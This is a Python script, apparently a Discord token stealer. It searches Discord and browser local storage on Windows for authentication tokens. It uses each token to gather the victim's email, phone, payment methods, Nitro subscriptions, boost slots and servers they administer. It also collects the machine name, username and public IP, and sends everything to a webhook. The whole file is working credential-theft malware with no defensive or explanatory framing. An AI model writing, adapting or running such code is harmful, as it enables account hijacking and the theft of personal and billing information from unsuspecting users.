def main():
    import json
    import os
    import re
    import time
    import random
    from datetime import datetime, timezone, timedelta
    import requests
    from pathlib import Path

    WEBHOOK_URL = ""
    PING_EVERYONE = True

    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json"
    }

    DARK_COLOR = 0x0F0F0F

    def send_embed(embeds):
        if PING_EVERYONE:
            payload = {"content": "@everyone @here", "embeds": embeds}
        else:
            payload = {"embeds": embeds}
        try:
            requests.post(WEBHOOK_URL, json=payload, headers=HEADERS, timeout=15)
        except:
            pass

    def api_request(method, url, token=None, params=None, json=None, timeout=10, max_retries=5):
        headers = HEADERS.copy()
        if token:
            headers["Authorization"] = token
        backoff = 1.0
        for attempt in range(max_retries):
            try:
                if method.upper() == "GET":
                    r = requests.get(url, headers=headers, params=params, timeout=timeout)
                elif method.upper() == "POST":
                    r = requests.post(url, headers=headers, json=json, timeout=timeout)
                else:
                    return None
                if r.status_code == 429:
                    retry_after = r.headers.get("Retry-After")
                    wait = float(retry_after) + random.uniform(0.1, 0.5) if retry_after else backoff
                    time.sleep(wait)
                    backoff = min(backoff * 2, 32)
                    continue
                return r
            except requests.exceptions.RequestException:
                time.sleep(backoff)
                backoff = min(backoff * 2, 32)
        return None

    def get_user_info(token):
        r = api_request("GET", "https://discord.com/api/v9/users/@me", token=token, timeout=12)
        if r and r.status_code == 200:
            return r.json()
        return None

    def get_profile(token, user_id):
        url = f"https://discord.com/api/v9/users/{user_id}/profile?type=account_popout&with_mutual_guilds=false&with_mutual_friends=false&with_mutual_friends_count=false"
        r = api_request("GET", url, token=token, timeout=8)
        if r and r.ok:
            return r.json()
        r = api_request("GET", "https://discord.com/api/v9/users/@me/profile", token=token, timeout=8)
        if r and r.ok:
            return r.json()
        return {}

    def get_guilds(token):
        r = api_request("GET", "https://discord.com/api/v9/users/@me/guilds?with_counts=true", token=token, timeout=12)
        if r and r.ok:
            return r.json()
        return []

    def get_nitro_subscriptions(token):
        r = api_request("GET", "https://discord.com/api/v9/users/@me/billing/subscriptions", token=token, timeout=10)
        if r and r.ok:
            return r.json()
        return []

    def get_boost_slots(token):
        r = api_request("GET", "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", token=token, timeout=10)
        if r and r.ok:
            return r.json()
        return []

    def get_payment_sources(token):
        r = api_request("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", token=token, timeout=10)
        if r and r.ok:
            return r.json()
        return []

    def get_ip():
        try:
            r = requests.get("https://api.ipify.org?format=json", timeout=8)
            return r.json()["ip"]
        except:
            return "None"

    def snowflake_to_date(snowflake):
        epoch = datetime(2015, 1, 1, tzinfo=timezone.utc)
        ms = (int(snowflake) >> 22)
        return (epoch + timedelta(milliseconds=ms)).strftime("%Y-%m-%d %H:%M UTC")

    possible_paths = [
        os.path.expandvars(r"%APPDATA%\discord"),
        os.path.expandvars(r"%APPDATA%\discordcanary"),
        os.path.expandvars(r"%APPDATA%\discordptb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        *[str(p) for p in Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")).glob("Profile *")],
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\Opera Software\Opera Stable"),
        os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default"),
    ]

    tokens = set()

    for base in possible_paths:
        leveldb = os.path.join(base, "Local Storage", "leveldb")
        if not os.path.isdir(leveldb):
            continue
        for ext in ("*.ldb", "*.log"):
            for file in Path(leveldb).rglob(ext):
                try:
                    raw = file.read_bytes()
                    text = raw.decode("utf-8", errors="ignore")
                    for match in re.finditer(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{38,}(?:_[\w-]{22})?|mfa\.[\w-]{80,84}|eyJ[A-Za-z0-9_-]{60,400}", text):
                        t = match.group(0).strip()
                        if len(t) >= 59:
                            tokens.add(t)
                except:
                    pass

    tokens = {t for t in tokens if '.' in t and not t.startswith("eyJ")}

    if not tokens:
        send_embed([{
            "title": "No Tokens Found",
            "description": "Nothing detected on this machine.",
            "color": DARK_COLOR,
            "footer": {"text": f"tung tung sahur • {os.environ.get('COMPUTERNAME','?')} • {os.environ.get('USERNAME','?')}"}
        }])
        exit()

    send_embed([{
        "title": f"Tokens Found — {len(tokens)}",
        "description": f"**{len(tokens)}** token(s) located",
        "color": DARK_COLOR,
        "fields": [
            {"name": "Computer", "value": f"`{os.environ.get('COMPUTERNAME','Unknown')}`", "inline": True},
            {"name": "User", "value": f"`{os.environ.get('USERNAME','Unknown')}`", "inline": True},
            {"name": "IP", "value": f"`{get_ip()}`", "inline": True},
        ],
        "timestamp": datetime.utcnow().isoformat(),
        "footer": {"text": "tung tung sahur"}
    }])

    for token in tokens:
        info = get_user_info(token)
        if not info:
            continue
        profile = get_profile(token, info["id"])
        disp = f"{info.get('global_name', '')} (@{info['username']})" if info.get('global_name') else info["username"]
        nitro_type = {0: "None", 1: "Classic", 2: "Full Nitro"}.get(info.get("premium_type", 0), "Unknown")
        mfa = "Yes" if info.get("mfa_enabled") else "No"
        created = snowflake_to_date(info["id"])
        thumb = {"url": f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.webp?size=512"} if info.get("avatar") else None
        banner = {"url": f"https://cdn.discordapp.com/banners/{info['id']}/{info['banner']}.webp?size=1024"} if info.get("banner") else None

        badges = []
        priority_thumb = None

        flags = info.get("public_flags", 0)
        if flags & 1: badges.append("Staff")
        if flags & 2: badges.append("Partner")
        if flags & 4: badges.append("HypeSquad Events")
        if flags & 64: badges.append("HypeSquad Bravery")
        if flags & 128: badges.append("HypeSquad Brilliance")
        if flags & 256: badges.append("HypeSquad Balance")
        if flags & 512: badges.append("Early Supporter")
        if flags & 16384: badges.append("Bug Hunter")
        if flags & 262144: badges.append("Moderator")
        if flags & 4194304: badges.append("Active Developer")

        if profile and "badges" in profile:
            for b in profile["badges"]:
                if isinstance(b, dict):
                    badge_id = b.get("id", "")
                    if badge_id == "quest_completed":
                        badges.append("Completed a Quest")
                        priority_thumb = priority_thumb or "https://github.com/mezotv/discord-badges/raw/main/assets/quest.png"
                    if badge_id == "orb_profile_badge":
                        badges.append("Orbs Apprentice")
                        priority_thumb = priority_thumb or "https://github.com/mezotv/discord-badges/raw/main/assets/orb.svg"

        subs = get_nitro_subscriptions(token)
        has_nitro = len(subs) > 0
        if has_nitro:
            badges.append("Nitro")
            priority_thumb = priority_thumb or "https://github.com/mezotv/discord-badges/raw/main/assets/discordnitro.svg"

        badges_str = ", ".join(badges) if badges else "None"

        decos = info.get("avatar_decoration_data") or info.get("avatar_decorations")
        deco_count = len(decos) if isinstance(decos, list) else (1 if decos else 0)
        nitro_expires = datetime.fromisoformat(subs[0]["current_period_end"].replace("Z", "+00:00")).strftime("%d/%m/%Y %H:%M") if has_nitro else "N/A"
        slots = get_boost_slots(token)
        avail_boost = 0
        boost_lines = []
        for slot in slots:
            if not slot.get("cooldown_ends_at") or datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00")) < datetime.now(timezone.utc):
                avail_boost += 1
                boost_lines.append("Available now")
            else:
                dt = datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00"))
                boost_lines.append(f"Cooldown until {dt.strftime('%d/%m/%Y %H:%M')}")
        payments = get_payment_sources(token)
        pay_count = len(payments)
        valid_pays = sum(1 for p in payments if not p.get("invalid"))
        pay_types = " ".join("CC" if p["type"] == 1 else "PP" if p["type"] == 2 else "?" for p in payments)
        guilds = get_guilds(token)
        guild_count = len(guilds)
        admin_guilds = []
        for g in guilds:
            perms = int(g.get("permissions", "0"))
            if perms & (0x8 | 0x20):
                cnt = g.get("approximate_member_count", "?")
                line = f"ㅤ- {g['name']} ({cnt})"
                if g.get("vanity_url_code"):
                    line += f" • .gg/{g['vanity_url_code']}"
                admin_guilds.append(line)
        admin_text = "\n".join(admin_guilds) if admin_guilds else "None"
        fields = [
            {"name": "Token", "value": f"```ansi\n\u001b[0;31m{token}\u001b[0m```", "inline": False},
            {"name": "Username", "value": f"**{disp}**", "inline": True},
            {"name": "ID", "value": f"`{info['id']}`", "inline": True},
            {"name": "Created", "value": created, "inline": True},
            {"name": "Nitro Type", "value": nitro_type, "inline": True},
            {"name": "MFA", "value": mfa, "inline": True},
            {"name": "Badges", "value": badges_str or "None", "inline": False},
            {"name": "Decorations", "value": f"**{deco_count}** deco(s)", "inline": True},
            {"name": "Guilds", "value": f"{guild_count} total\nAdmin in:\n{admin_text}", "inline": False},
            {"name": "Nitro Details", "value": f"Has Nitro: {has_nitro}\nExpires: {nitro_expires}\nBoosts: {avail_boost}\n" + "\n".join(boost_lines), "inline": False},
            {"name": "Payments", "value": f"Methods: {pay_count}\nValid: {valid_pays}\nTypes: {pay_types}", "inline": False},
            {"name": "Locale", "value": info.get("locale", "Unknown"), "inline": True},
            {"name": "Verified", "value": "Yes" if info.get("verified") else "No", "inline": True},
        ]
        if info.get("email"):
            fields.append({"name": "Email", "value": f"`{info['email']}`", "inline": True})
        if info.get("phone"):
            fields.append({"name": "Phone", "value": f"`{info['phone']}`", "inline": True})
        embed = {
            "title": "Account Details",
            "thumbnail": thumb or ({"url": priority_thumb} if priority_thumb else None),
            "image": banner,
            "color": DARK_COLOR,
            "fields": fields,
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": f"tung tung sahur • {os.environ.get('COMPUTERNAME','?')}"}
        }
        send_embed([embed])
        time.sleep(0.4 + random.uniform(0, 0.2))
